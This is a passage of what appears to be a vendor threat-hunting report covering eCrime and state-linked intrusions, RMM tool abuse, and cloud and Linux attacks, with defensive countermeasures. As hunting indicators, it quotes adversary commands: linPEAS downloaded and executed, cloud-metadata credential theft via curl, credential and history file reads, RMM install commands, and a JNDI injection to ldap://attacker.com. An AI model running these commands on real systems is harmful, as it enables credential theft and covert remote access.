tangible\ndifferences in the scale and sophistication of activity we defenders face.\n\nThe most notable change in the past year was the increase in instances of data\ntheft and extortion without the use of ransomware — a trend the CrowdStrike\n2023 Global Threat Report revealed grew by 20% year over year in 2022. This\ndevelopment is the latest demonstration of the business acumen of today’s\neCrime adversaries and their ability to continually optimize their operations.\n\nAlthough the impact of eCrime operations is often what grabs headlines, what\nhappens before extortion is what matters most when it comes to proactive\ndefense. Falcon OverWatch examines threat activity from a distinctly defensive\nvantage point. Rather than focusing retrospectively on the impact of intrusions,\nthreat hunters focus on the patterns of activity that provide the earliest possible\nsignal of intrusion. Looking back over the past year, Falcon OverWatch hunters\nuncovered both unexpected and expected trends emerging across interactive\neCrime intrusions.\n\nOne development observed by Falcon OverWatch this year is a shift in follow-on\nbehaviors from INDRIK SPIDER. Falcon OverWatch saw several instances of\notherwise opportunistic initial access activity evolve into more tailored follow-on\nattack patterns once the threat actor identified that they had caught a lucrative\nvictim in their widely cast net.\n\nThis year’s anticipated trends involve the abuse of tried-and-true methods to\naccess and navigate victim environments. These methods include exploitation of\nvulnerabilities and the use of RMM tools.\n\n16 [For more information on how to gain visibility into cybercrime activities, see the CrowdStrike Falcon® Intelligence Recon webpage.](https://www.crowdstrike.com/products/threat-intelligence/falcon-intelligence-recon/)\n\n\n##### Key Facts and Figures at a Glance:\n\n### 312%\n```\n  INCREASE IN ADVERSARY USE OF\n  RMM TOOLS YEAR OVER YEAR\n\n 147%\n  INCREASE IN ACCESS BROKER\n  ADVERTISEMENTS IN CRIMINAL OR\n  UNDERGROUND COMMUNITIES[16]\n\n 20+%\n  OF ALL INTERACTIVE INTRUSIONS\n  INVOLVED EXPLOITATION OF PUBLIC-\n  FACING APPLICATIONS[17]\n\n```\n\n-----\n\n```\nINDRIK SPIDER BRINGS THE TAILORED\nEXPERIENCE TO OPPORTUNISTIC ECRIME\n\n```\n\nThis year, Falcon OverWatch observed numerous intrusions in which adversaries\nappeared to cast a wide net across multiple regions and verticals for initial access,\nthen tailored their follow-on tactics, techniques and procedures (TTPs) upon\ndiscovering they hit a high-value target.\n\nOver the past year, INDRIK SPIDER was at the forefront of this trend, tailoring\ntheir operations based on characteristics of the compromised host and the victim\norganization. In multiple intrusions, INDRIK SPIDER took a multi-phased approach,\nbeginning with the use of the SocGholish tool to opportunistically find victims.\nThis was followed by the use of a malicious JavaScript file that runs discovery\ncommands — in particular, these commands look to see whether the victim host is\ndomain-joined. Upon discovering domain-joined hosts, INDRIK SPIDER transitioned\nfrom scripted to interactive activity. In further evidence that the interactive follow-on\nactivity was tailored to the victim organization, Falcon OverWatch discovered that\nthe malicious DLLs deployed to the target victims were environmentally keyed with\neach targeted organization’s domain name.\n\n###### Phase One: Cast a Wide Net with SocGholish\n\nIn this ongoing campaign, users who visit a compromised or malicious website with\nthe SocGholish script are served a malicious pop-up, and social engineering and\nmasquerading techniques are used to trick the user into downloading, extracting\nand executing a JavaScript file known as a Fake Browser Update (FBU). Examples\nof these FBUs include Update.js, Chrome.Update.xxxxxx.js and Edge.js.\n\nUpon execution,[18] the FBU conducts multiple scripted[19] discovery activities before\nrelaying the data over C2 infrastructure and evaluating the response it receives.\n\nThe FBU script delivered by SocGholish retrieves information via various\ndiscovery[20] techniques and exfiltrates[21] this data so that follow-on activity can be\nexecuted depending on the response.\n\n18 [For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1204/002/.](https://attack.mitre.org/techniques/T1204/002/)\n\n19 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1059/.](https://attack.mitre.org/techniques/T1059/)\n\n20 [For more information on this technique, see the MITRE website: https://attack.mitre.org/tactics/TA0007/.](https://attack.mitre.org/tactics/TA0007/)\n\n\n-----\n\n###### Phase Two: Identify Victims of Interest\n\nThe follow-on behavior appeared to be determined by whether or not the affected\nhost was domain-joined — information that was gathered during the initial stages of\nthe intrusion. In some instances, Falcon OverWatch observed a NetSupport RAT\npayload being deployed for remote administration. In other cases, compromised\nhosts received a DLL containing a BlisterLoader-packed Cobalt Strike implant.\n\nWhen NetSupport RAT installation occurred, it was installed almost instantly. This\nindicates the adversary used a set of predefined conditions to determine whether\nto deploy NetSupport RAT. To deploy NetSupport RAT, execution of a PowerShell\ndownload cradle occurs to retrieve and execute a script masquerading as an\nSVG image file. The masqueraded script downloads the RAT, sets persistence via\nthe registry run key[22] for the current user and executes the RAT using Windows\nManagement Instrumentation (WMI).\n\n###### Phase Three: Go Hands-On\n\nIn the SocGholish-based intrusions that leveraged a BlisterLoader-packed Cobalt\nStrike implant, Falcon OverWatch observed a distinct delay between initial access\nand automated discovery actions, and observed follow-on activity. This delay is\nlikely due to the transition from automated malicious activity to hands-on-keyboard\nactivity. Falcon OverWatch found that the packed DLLs were environmentally\nkeyed[23] with each targeted organization’s domain name, leading Falcon OverWatch\nto conclude this activity was tailored to the victim. The environmental keying allowed\nthe resulting payload to be unpacked and executed only in the correct environment.\n\nWritten DLLs containing the packed Cobalt Strike implant were also named after\nthe compromised organization in which they were executed or were otherwise\nfound to be masquerading under the name of a third-party security company in\ninstances where persistence was established.\n\nDuring this phase of the intrusions, the threat actor also conducted further\ndiscovery activity — including enumerating domain trusts[24] and domain controllers\nand attempting credential access using the cmdkey `/list command. Further`\ncommands and scripts were also run that directed their output to temporary files\nfor later exfiltration.\n\nCrowdStrike Intelligence subsequently attributed this BlisterLoader-packed Cobalt\nStrike implant to INDRIK SPIDER. Other activity observed during INDRIK SPIDER\nSocGholish-based intrusions included credential access using SharpChromium,\nKerberoasting using Rubeus and SharpRoast, and attempts to block event tracing\nfor Windows to evade defenses.\n\n22 [For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1547/001/.](https://attack.mitre.org/techniques/T1547/001/)\n\n23 [For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1480/001/.](https://attack.mitre.org/techniques/T1480/001/)\n\n\n###### What Is Environmental Keying?\n\nEnvironmental keying prevents malicious\nbinaries from executing their intended\npayload unless they are executing within a\ntarget environment. This is commonly used\nin targeted intrusions to hinder attempts to\nreverse engineer, sandbox or detect with\nantivirus (AV) products and hide the tactics\nand techniques leveraged by the malicious\nbinary.\n\nOne method of environmental keying noted\nduring INDRIK SPIDER-related intrusions\nis the use of BlisterLoader, which checks\nfor a system’s Active Directory domain\nname upon executing and immediately\nterminates if the hash does not match a\nhardcoded value.\n\n\n-----\n\n```\nACCESS BROKERS ABUSE VULNERABILITIES \nFOR INITIAL ACCESS\n\n```\nExploitation of public-facing applications is another common theme across both eCrime\nand targeted intrusion activity this year, observed in over 20% of all interactive intrusions.[25]\nVulnerabilities in various productivity applications are at the center of this activity. In many\ncases, vulnerabilities were patched at the time of exploitation, but those patches had not\nbeen applied to the affected services.\n\nProductivity applications often sit on the edge of an organization’s infrastructure and can\nbe missed when security controls are enforced across the rest of the environment. Without\nan external attack surface management (EASM) solution,[26] defenders can easily lose track\nof just how many applications and services are exposed externally — increasing the risk of\nexposure to a vulnerability or chain of vulnerabilities. Given the scale at which vulnerabilities\nare disclosed, it is unsurprising that many organizations struggle to keep up with timely\nremediation. For this reason, defenders need to look beyond the Common Vulnerabilities\nand Exposures (CVEs) and ensure post-exploitation activity can be quickly identified and\neffectively controlled. The ability to readily identify malicious follow-on activity within an\nenvironment is also an effective control against unpatched or undisclosed vulnerabilities.\n\nSince early 2023, a series of compromises involving Oracle WebLogic Server (WLS) were\nassociated with Java Network Discovery Interface (JNDI) injection via CVE-2023-21839.\nThis activity aligned with either opportunistic eCrime activity using a publicly available exploit\nor an independently developed exploit variant associated with suspected China-nexus\ntargeted intrusion activity. This variant was observed in historic WLS activity targeting a\ndifferent vulnerable Java object than those publicly known. Based on these observations,\nCrowdStrike Intelligence assesses that a variation of CVE-2023-21839 WLS instances has\nbeen repeatedly exploited in the wild since late February 2023.\n\n25 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1190/.](https://attack.mitre.org/techniques/T1190/)\n\n```\nACCESS BROKERS ABUSE VULNERABILITIES \nFOR INITIAL ACCESS\n\n```\n\n-----\n\n**JNDI injection request**\n**1** **ldap://attacker.com** **WEBLOGIC SERVER** **2** **Queries LDAP server**\n\n|JNDI injection request 1 ldap://attacker.com|Col2|\n|---|---|\n|||\n\n\n**ldap://attacker.com**\n**(attacker HTTP server)**\n\n\n###### Figure 9. JNDI injection to achieve remote code execution (RCE) via CVE-2023-21839\n\nAnother Oracle exploit — abusing an arbitrary file overwrite vulnerability impacting E-Business Suite (CVE-202221587) — was also repeatedly observed during early 2023. This included suspected CVE-2023-21839 exploitation\nby the notorious access broker PROPHET SPIDER, the most prolific eCrime adversary exploiting public-facing web\napplications this past year.[27]\n\nAccess brokers share some operational commonalities with state-nexus threat actors: gaining initial access to an\norganization through exploitation, attempting to remain hidden from traditional detection systems and establishing\npersistent access to an organization until follow-on activity occurs.\n\nAccess brokers sell their established access to a variety of clientele. This has a dual impact on the eCrime\necosystem. First, it lowers the barrier to entry for individuals looking to conduct criminal operations. Second, it\nallows for established adversaries to focus their efforts on honing their post-exploitation tradecraft to achieve their\nmalicious objectives more efficiently.\n\nIn the past year, there has been a 147% increase in access broker advertisements in criminal or underground\ncommunities. This stark increase in supply of compromised credentials is likely indicative of growing demand from\nadversaries looking to buy these credentials for follow-on activity.\n\n\n-----\n\n##### Defensive Countermeasures\n\n###### Prioritize identity protection.\n\nWith identity becoming the new perimeter that adversaries exploit, defenders must\nadapt their security measures accordingly to stay ahead of threats and counteract\ntactics for gaining initial access.\n\n###### Stay on top of patching and updates.\n\nEnsure that all systems, software and applications are up-to-date with the latest\npatches. “Low-hanging fruit” vulnerabilities are a common entry point for initial\naccess brokers.\n\n###### Hunt for follow-on behaviors.\n\nWhile the vulnerability landscape changes daily, the post-exploitation actions an\nadversary takes in achieving their objectives are much less dynamic. Continuous\nhunting for known patterns of adversary behavior — such as logging in from\nnew locations, accessing resources outside of normal operating hours and\naccess-denied events — is an effective way to identify the abuse of both known and\nunknown vulnerabilities.\n\n###### Implement multifactor authentication (MFA) wherever possible.\n\nMFA provides an added layer of security that can prevent account compromise,\neven in the event of credential compromise.\n\n###### Leverage up-to-date threat intelligence.\n\nStay informed about the latest adversarial tradecraft as it relates to initial access\nbrokers to better understand their TTPs.\n\n\n-----\n\n```\n       REMOTE MONITORING AND MANAGEMENT TOOLS\n\n```\n\nRMM tools allow information technology (IT) administrators\nto remotely support workstation and server endpoints.\nHowever, these packages are commonly abused by\nadversaries seeking to gain and maintain a C2 channel into\na victim’s environment.\n\nThis past year, Falcon OverWatch observed RMM tools\nused in approximately 14% of all intrusions, and the volume\nof intrusions where RMM tools were leveraged by threat\nactors increased by 312% year over year. Figure 10\nhighlights the top 10 RMM tools abused by threat actors\nand the relative change in their use from last year’s reporting\nperiod to this year’s.\n\nThe top tool used this past year by a large margin was\nAnyDesk. In intrusions where AnyDesk was observed,\neCrime activity comprised 73% of the intrusions, targeted\nactivity comprised 4% of intrusions and unattributed activity\nmade up the remaining 23%. ScreenConnect and Atera\nAgent were also routinely used by eCrime threat actors.\n\nFalcon OverWatch frequently observed multiple RMM\ntools in individual intrusions perpetrated by eCrime actors,\nindicating eCrime actors are inclined to quickly swap tools\nto achieve their desired outcomes. The threat actors benefit\nfrom ease of use and lack of required effort compared to\ndeveloping their own custom tools.\n\n|Col1|2023 2022|Col3|\n|---|---|---|\n\n\n###### Figure 10. Comparison of the incidence of RMM tools most frequently observed by Falcon OverWatch in interactive intrusions, July 2022-June 2023 vs. July 2021-June 2022\n\n\n-----\n\n##### Observed Threat Actor Behaviors\n\nRMM tools typically enter an environment through common command-line\ningress methods including curl, `wget` and PowerShell, and in the case of an\nadversary-controlled RDP session, via standard web browsers or RDP clipboard\nredirection. Once in the environment, threat actors often attempt to conceal the\npresence of their tool. In one example, DISTANT SPIDER was observed installing\nScreenConnect as a service on a Windows endpoint and masquerading the service\nname to appear as a Microsoft service. Falcon OverWatch also observed threat\nactors designating RMM tools and other client binaries as hidden system files using\nthe attrib +s +h command to change the file attributes and ultimately attempt to\nconceal the file from view.\n\n###### Notable Tool: RustDesk\n\nRustDesk is an RMM tool written in the Rust programming language with typical\nRMM functionality. Since 2022, Falcon OverWatch has observed SCATTERED\nSPIDER and ALPHA SPIDER, alongside other eCrime and nation-state adversaries,\nusing RustDesk in their interactive intrusions. RustDesk is an open-source\npackage.[28] Source code, as well as pre-compiled binaries, are readily available for\nclient and server components and for multiple operating systems. Adversaries have\nlikely adopted RustDesk to avoid detections in place for myriad other well-known\nRMM alternatives.\n\n###### Notes for Defenders\n\nThe RustDesk domain rustdesk[.]com and GitHub repository\n```\ngithub[.]com/rustdesk host binaries and source code for RustDesk.\n\n```\nUnauthorized use of this tool is the first indicator of potentially malicious activity.\n\nRustDesk can be configured to use any internal or external IP or domain for\nits server components. Therefore, defenders must look for other indicators\nof attack (IOAs). The client install tends to be artifact-heavy, based on Falcon\nOverWatch observations. The following are example command lines from Falcon\nOverWatch-observed intrusions that can be used when looking for evidence of\nmalicious activity.\n\nThe RustDesk installer may configure a Windows host firewall rule for client\ncommunication:\n```\nnetsh advfirewall firewall add rule name=\"RustDesk Service\" dir=in\naction=allow\n     program=\"C:\\Program Files\\RustDesk\\RustDesk.exe\" \nenable=yes\n\n```\n\n-----\n\nThe RustDesk installer may add registry keys for the installed client:\n```\nreg add\n     HKEY_CLASSES_ROOT\\.rustdesk\\shell\\open\\command /f /ve \n/t REG_SZ /d \"\\\"C:\\Program Files\\RustDesk\\RustDesk \n     exe\\\" --play \\\"%1\\\"\"\nreg add\n     HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\\n     CurrentVersion\\Uninstall\\RustDesk /f /v \n     UninstallString /t REG_SZ /d \"\\\"C:\\Program Files\\\n     RustDesk\\RustDesk.exe\\\" --uninstall\"\n\n```\nThe RustDesk installer may create a service, with or without an imported\nconfiguration option, for the installed client:\n```\nsc create RustDesk binpath= \"\\\"C:\\Program Files\\RustDesk\\RustDesk.\nexe\\\" --import-config \\\"C:\\Users\\[REDACTED Path]\\AppData\\Roaming\\\nRustDesk\\config\\RustDesk.toml\\\"\" start= auto DisplayName= \"RustDesk\nService\"\nsc create RustDesk binpath= \"\\\"C:\\Program Files\\RustDesk\\RustDesk.\nexe\\\" --service\" start= auto DisplayName= \"RustDesk Service\"\n\n###### Notable Tool: FleetDeck\n\n```\nFalcon OverWatch observed FleetDeck abuse exclusively by SCATTERED\nSPIDER.[29] If FleetDeck is not a legitimate tool in the IT environment, the unexpected\npresence of the tool should be taken as an IOA.\n\nFleetDeck currently supports agents for the Windows operating system, with\nagents for macOS and Linux in development. Remote agents operate over TCP port\n443, which, depending on host and network firewall configurations, may facilitate\negress from victim environments. Like RustDesk, the tool is new and less likely to be\ndetected than more prevalent RMM tool choices. Unlike RustDesk, the product is a\ncommercial offering, and source code is not available.\n\n29 For more details of SCATTERED SPIDER’s use of RMM tools, see this related blog:\n\n[https //wwwcrowdstrike com/blog/analysis of intrusion campaign targeting telecom and bpo companies/](https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/)\n\n\n-----\n\n###### Notes for Defenders\n\nFalcon OverWatch observed FleetDeck activity at multiple entities primarily in the\nservices, technology and telecommunications verticals. The following insights\nare based on this real-world activity and contain common indicators of FleetDeck\nactivity, which defenders can use when hunting.\n\nThe adversary tested the internet connection to FleetDeck domain:\n```\nping fleetdeck.io\n\n```\nThe adversary dropped the FleetDeck agent to the victim environment:\n```\nC:\\Users\\[REDACTED Path]\\Downloads\\fleetdeck-agent-[REDACTED\n22CharacterKey].exe\n\n```\nNote that the agent installer listed above can be executed silently by appending the\n```\n-silent flag to the command.\n\n```\nThe adversary created a Windows host firewall rule via PowerShell for FleetDeck\nclient communication:\n```\nC:\\WINDOWS\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -Command\n\"New-NetFirewallRule -DisplayName 'FleetDeck Agent Service' -Name\n'FleetDeck Agent Service Command' -Direction Inbound -Program 'C:\\\nProgram Files (x86)\\FleetDeck Agent\\fleetdeck_agent_svc.exe' -Action\nAllow\"\n\n```\n\n-----\n\n##### Defensive Countermeasures\n\n###### Monitor and conduct active hunts for newly identified threats.\n\nThe RMM tool landscape is dynamic. As new tools are identified or known tools add\nnew functionality, research the new RMM behaviors and actively review logs for\nevidence of execution.\n\n###### Implement application allowlisting.\n\nThreat actors may attempt to execute RMM tools that are not standard software in\nthe victim environment.

The benefits that cloud computing provides have made it an\nindispensable part of businesses’ modern IT infrastructure. However, the rapid\nsurge in demand for cloud services, along with the complexity of cloud management\nand controls, has led to a knowledge gap in properly securing these environments.\nThe nature of the attack surface has changed and presents significant security\nchallenges for organizations with a cloud presence.\n\nIn the past year, Falcon OverWatch has observed numerous instances of insecure\nconfigurations as well as built-in cloud platform functionality being abused by\nadversaries to progress their intrusions. As first reported in the CrowdStrike 2023\nGlobal Threat Report, there was a threefold increase in cases involving cloudconscious threat actors coupled with a 95% increase in cloud exploitation from\n2021 to 2022. It is clear that adversaries are aware of the importance of the cloud\nand tenacious in their efforts to access cloud assets.\n\nWhen it comes to securing the cloud, the old security adage “know thy systems''\nis particularly pertinent. Adversaries are quick to take advantage of visibility and\nknowledge gaps.\n\n\n##### Key Facts and Figures at a Glance:\n\n### 3X\n```\n  INCREASE IN THE USE OF LINUX\n  PRIVILEGE ESCALATION TOOL\n  LINPEAS\n\n 95%\n  INCREASE IN CLOUD\n  EXPLOITATION IN 2022\n\n 3X\n  INCREASE IN CASES INVOLVING\n  CLOUD-CONSCIOUS THREAT ACTORS\n\n```\n\n-----\n\n```\nADVERSARIES LEVERAGE LINPEAS TOOL\nFOR CLOUD DISCOVERY\n\n```\nFalcon OverWatch detected several intrusions at the cloud workload level where\nadversaries gained access to a cloud server and used the Linux privilege escalation\ntool linPEAS to enumerate the environment. Although linPEAS has been around\nfor several years, in the past year, Falcon OverWatch saw its use by eCrime and\ntargeted intrusion adversaries triple.\n\nLinPEAS has a cloud module that attempts to determine in which cloud\nenvironment, if any, the module is running through a process of fingerprinting.\nThis process inspects local files including /etc/hosts, /etc/resolv.conf and\nvendor-specific configuration files, as well as HTTP requests using both curl and\n```\nwget, to a well-known cloud service provider’s API endpoints. The cloud module\n\n```\ncurrently supports discovery of Google Cloud, DigitalOcean Droplet, IBM Cloud,\nand Amazon's Elastic Container Service (ECS), Elastic Compute Cloud (EC2),\nEC2 Beanstalk and Lambda. If a cloud service provider is identified, the module will\nenumerate details of the identified cloud environment, which may include machine\nattributes such as the instance metadata (ID, name, region or zone, and image);\nnetwork attributes (public and private IPs, hostnames); and various user, service\nand security credentials depending on cloud service provider and cloud security\nconfiguration.\n\nIn one instance, Falcon OverWatch discovered an adversary downloading a precompiled version of the linPEAS tool. They renamed the file via mv, set execute\npermissions and attempted execution of the file:\n```\nwget https[:]//github[.]com/carlospolop/PEASS-ng/releases/download/\n[REDACTED Path]/linpeas_darwin_arm64\nmv linpeas_darwin_arm64 x\nchmod +x x\n./x\n\n```\nNot all ingress of the linPEAS tool comes from the official GitHub repository\n— adversaries are also known to stage tooling to sources under their control.\nReasons for this may include ready access to custom-compiled versions to evade\nsignature-based detection, as well as avoiding source URLs that identify the tooling.\nIn this second example, Falcon OverWatch observed the adversary attempting to\ndownload linPEAS from a common file-sharing website after a previous attempt\nfrom the GitHub repository was prevented:\n```\nwget https[:]//github[.]com/carlospolop/PEASS-ng/releases/download/\n[REDACTED Path]/linpeas_linux_amd64 -O aa\nwget https[:]//filebin[.]net/[REDACTED Path]/[REDACTED FileName]\n\n```\nThe cloud discovery module of linPEAS can allow access to sensitive information\nabout cloud environments. However, these examples also highlight a long-term,\npersistent problem Falcon OverWatch observes across many intrusions: Victim\nenvironments are configured in a way that enables the adversary to access external\nresources from within the victim environment to download additional malware.\n\n\n-----\n\n##### Defensive Countermeasures\n\n###### On-premises security best practices apply in the cloud.\n\nIn the previous examples, the adversary initiated an outbound connection from\nthe cloud workload instance to an external website to download malicious files.\nCloud workload servers should be subject to at least the same security policies as\nany other server. Best practice dictates that outbound connections initiated from\nany server should be denied other than to allowlisted endpoints.[30] This practice\naccomplishes two important goals: First, it helps to deny the adversary access\nto internet resources and prevents direct malware ingress. Second, if an attack\nshould progress, it makes it much more difficult for an adversary to exfiltrate data or\nestablish a C2 channel directly from the compromised cloud asset to an external\nendpoint.\n\n###### Know your systems or invest in security measures to improve visibility.\n\nCrowdStrike's cloud-native application protection platform (CNAPP)[31] provides\nvisibility into cloud assets and can help security practitioners understand and\nimprove the overall baseline security posture and compliance of their environments.\nFalcon OverWatch provides added defense in the cloud for novel threats and alerts\nsecurity teams with contextualized detection information when such threats are\ndiscovered in a customer's environment.\n\n30 For further guidance, see NIST 800-53 REV 5, SC-7(5).\n\n\n\n[30] This practice\n\n[31] provides\n\n\n-----\n\n```\nECRIME ADVERSARIES USE AZURE RUN\nCOMMANDS TO DEPLOY MALWARE\n\n```\nAlthough not new, a less commonly discussed vector for cloud-conscious\nexecution is the use of Azure Run Commands. In the past year, Falcon OverWatch\nobserved multiple instances of eCrime adversaries using this Azure feature\nto attempt script execution across virtual machines (VMs) in Azure cloud\nenvironments.\n\nRun Commands are part of the default VM agent and legitimately used to manage\nAzure VMs. Azure supports multiple versions of Windows and various distributions\nof Linux. Azure Run Commands similarly support both operating systems. Azure\nRun Commands can be executed in several ways, including from the Azure Portal,\nAzure REST API, Azure Command-Line Interface (CLI) and through PowerShell on\nan Azure VM. An adversary can use Azure Run Commands to execute with elevated\nprivileges — PowerShell scripts on a Windows VM run as SYSTEM, and shell scripts\non a Linux VM run as root. This creates potential for remote execution, lateral\nmovement and privilege escalation, as such permissions to execute Azure Run\nCommands must be tightly controlled and closely monitored for any changes.\n\nAdversaries are actively exploiting this feature in Azure. In one example, Falcon\nOverWatch observed SCATTERED SPIDER execute a PowerShell script via the\n```\nRunPowerShellScript command to deploy an RMM binary to a set of Azure VMs.\n\n```\nFalcon OverWatch also observed adversaries attempting to use the technique to\ndeploy RMM binaries and other tools across Linux VMs.\n\nTo date, Falcon OverWatch has observed Azure Run Commands used primarily\nin attempts to deploy tooling across a victim environment. However, the elevated\nprivileges under which the scripts execute could also allow an adversary to read\nprivileged files, exfiltrate data and alter permissions of other files and directories,\nto name a few actions.\n\n\n-----\n\n##### Defensive Countermeasures\n\n###### Know where to look for trouble.\n\nIf malicious activity is suspected, the following locations are relevant for defenders\nto understand what is occuring.\n\nFor Azure Windows VMs, downloaded scripts will be placed in the following\ndirectories for execution:\n```\nC:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows\\<agent_\nversion>\\Downloads\\\n\n```\nOutput from the execution of the scripts can be found in a similar location:\n```\nC:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows\\<agent_\nversion>\\Status\\\n\n```\nFor Azure Linux VMs, both the downloaded scripts and the execution output\n(stdout and stderr) will be written in the same directory:\n```\n/var/lib/waagent/run-command/download/\n\n###### Understand the core functionality of the cloud platforms you’re running.\n\n```\nCloud-conscious adversaries will continue to seek new ways to use legitimate\nfeatures of Azure management and orchestration in support of their malicious\nobjectives. Falcon OverWatch encourages all defenders to dig deeper into the\ntechnology and fully understand the environments for which they are responsible.\nYou can find additional resources on the CrowdStrike Falcon® Cloud Security\nwebsite[32] to help with this journey.\n\n\n-----\n\n#### Compromised Cloud Credentials Facilitate Widespread Lateral Movement\n\nCloud-conscious adversaries are keenly aware of how to leverage cloud tooling and\nservices that are available to them once they gain an initial foothold into a victim’s\nenvironment. This is analogous to a traditional on-premises compromise, during\nwhich an adversary may use one of the many already installed tools — aka “living off\nthe land” binaries and scripts (LOLBAS) — to further their objectives. The following\nintrusion demonstrates the adversary TTPs used to pivot from on-premises devices\nto cloud infrastructure.\n\nIn early 2023, Falcon OverWatch detected an adversary exploiting a custom PHP\nweb application at a North American customer in the retail sector. By leveraging\na RCE vulnerability, the adversary was able to gain unauthorized access to\nthe underlying system. Once inside, they proceeded to harvest cloud service\nprovider credentials. Using these newly found credentials, the adversary began\nto move laterally in the victim’s environment using the cloud service provider’s\nsystem manager. This maneuver allowed the adversary to extend their reach to\ncompromise additional resources and embed deeper into the victim’s environment.\n\nThis intrusion, explored in more detail in Figure 11, highlights the expanded\nattack surface customers must now protect and the necessity of securing both\non-premises and cloud infrastructure components.\n\n##### Defensive Countermeasures\n\n###### Identify and manage vulnerabilities.\n\nRegularly monitor cloud assets and applications for vulnerabilities, and patch or\notherwise address identified risks in a timely manner. Vulnerable internet-facing\ncloud assets, in particular, are at risk of facilitating initial access for adversaries.\nConsider adopting cloud workload protection (CWP) solutions that offer continuous\nvulnerability management in addition to endpoint detection and response (EDR)\nand other runtime protections at both the cloud virtual machine and container levels.\n\n###### Secure from start to finish.\n\nCloud resource configurations should be standardized and validated prior to\ndeployment, and thereafter constantly monitored for deviations from approved\nstandards. Cloud security posture management (CSPM) solutions can help\nmonitor multiple cloud service providers, identify misconfigurations pre- and postdeployment, and significantly reduce risk. Secure configurations prevent access to\nsensitive resources by unauthorized entities, reducing the likelihood of success of\nfollow-on tactics such as privilege escalation, lateral movement and data collection.\n\n\n-----\n\n###### Initial Access\n\nThe adversary exploited an RCE vulnerability\n\nthat existed in a custom PHP application\n\nrunning on multiple Linux servers hosted in the\n\nvictim organization's Cloud Service Provider\n\nenvironment.\n\n###### Credential Access\n\nThe adversary attempted to harvest Cloud Service\n\nProvider credentials via the AWS Instance Metadata\n\nServices API.\n```\ncurl -k http://169.254.169[.]254/latest/\n    meta-data/iam/security-credentials/\ncurl -k http://169.254.169[.]254/latest/\nmeta-data/iam/security-credentials/\n              [REDACTED IAMRole]\n\n###### Discovery\n\n```\nVarious discovery commands were executed,\n\nincluding attempts to view potentially sensitive\n\ninformation.\n```\n        cat . bash_history, cat .env\n\n```\nCloud-conscious discovery included querying the\n\nAWS Instance Metadata Service API to enumerate\n\nIAM roles.\n```\n curl -k http://169.254.169[.]254/latest/\n    meta-data/iam/security-credentials/\n              [REDACTED IAMRole]\n\n```\n\n###### Persistence\n\nA cron job was created to download and run the Silver\n\nimplant upon reboot.

Falcon OverWatch threat hunters are skilled at\nhunting across all major platforms — Windows, Linux and macOS.\n\nThis year, Falcon OverWatch saw adversaries showcase their prowess across all\nof these systems. LABYRINTH CHOLLIMA led the charge, highlighting their ability\nto operate across Windows and macOS in their targeting of the 3CX supply chain.\nNotorious for targeting financial technology and cryptocurrency organizations,\nLABYRINTH CHOLLIMA was observed updating both their custom tooling and\ntheir tradecraft to work specifically on Linux and macOS.\n\n###### Threat Actor Spotlight: LABYRINTH CHOLLIMA\n\nLABYRINTH CHOLLIMA is one of the most prolific Democratic People’s Republic\nof Korea (DPRK) adversaries tracked by CrowdStrike and has been active since at\nleast 2009. CrowdStrike assesses this adversary is likely affiliated with Bureau 121\nof the DPRK’s Reconnaissance General Bureau (RGB) — North Korea’s preeminent\nintelligence service.\n\nTheir currency generation operations are global in scope, and stolen proceeds\nappear to be a lifeline for the DPRK regime. LABYRINTH CHOLLIMA’s operations\nhave varied in complexity and exhibit tradecraft ranging from pedestrian to stateof-the-art, suggesting this group is supported by a large number of operators with\nvarying technical aptitude. LABYRINTH CHOLLIMA’s campaigns broadly trend\ntoward a greater emphasis on operational security and defense evasion tactics,\nwith the adversary increasing efforts to evade traditional detection methods and\nhinder third-party analysis and tracking of its campaigns.\n\n\n###### Key Facts and Figures at a Glance:\n\n¼ 3x increase in adversaries\nreplacing Pluggable\nAuthentication Modules\n(PAM) with malicious\nmodules in Linux, typically for\nthe purposes of a backdoor\n\n¼ Technology,\ntelecommunications and\nacademic are the top\ntargeted Linux verticals\n\n¼ Finance, technology and\nservices are the top targeted\nmacOS verticals\n\n¼ LABYRINTH CHOLLIMA\nhas proven they are adept\nat operating in all major\noperating systems\n\n¼ After a first intrusion attempt,\nLABYRINTH CHOLLIMA will\noften attempt to gain access\nto a victim organization again\nwithin the same year\n\n\n-----\n\n```\nLINUX INSIGHTS AND TRENDS\n\n```\nFalcon OverWatch continues to observe adversaries operating comfortably\nwithin Linux environments to progress their mission objectives. As shown in\nFigure 12, Linux-based interactive intrusion activity is most commonly seen in the\ntechnology and telecommunications verticals.\n\n###### Figure 12. Linux-based intrusion activity by industry vertical, July 2022 to June 2023\n\n\n###### Common Linux Tooling Provides Substantial Functionality to Adversaries\n\nOver the past year, Falcon OverWatch observed adversaries traversing most\ntactics across the MITRE ATT&CK framework, leveraging only native or widely\naccessible command-line tooling. For example, an adversary can leverage nmap\nfor network discovery;[ 33] `cat to read various credentials, history,[34] configuration,`\nand database files; `ps, grep` or `find` to perform discovery on running\nprocesses and existing files; `ping for connectivity checks;[35]` `curl, git` or `wget`\nto download files; as to translate assembly code to object code; bash or python to\nexecute said scripts; and `rm` to delete logs and clean up their tracks.[36]\n\n\n33 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1046/.](https://attack.mitre.org/techniques/T1046/)\n\n34 [For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1552/003/.](https://attack.mitre.org/techniques/T1552/003/)\n\n\n###### The Role of Linux Hosts in an Organization\n\nBecause Linux hosts primarily\nfunction as infrastructure as opposed\nto end-user machines, typical social\nengineering tactics that require end-\nuser interaction — such as phishing\nattachments or end-user execution\n— are not viable initial access\ntechniques. Instead, adversaries\ntargeting Linux systems either\nleverage vulnerabilities in public-\nfacing applications or externally\nexposed remote services, or abuse\nvalid credentials to gain access to a\ntarget device. Once on a Linux host,\nan adversary’s success often hinges\non their ability to execute intrusions by\nleveraging native tools within a Linux\nenvironment. Where the required\ntools are not immediately available,\nthey are often easily accessible by\nleveraging native binaries to pull down\nscripts or tools from repositories 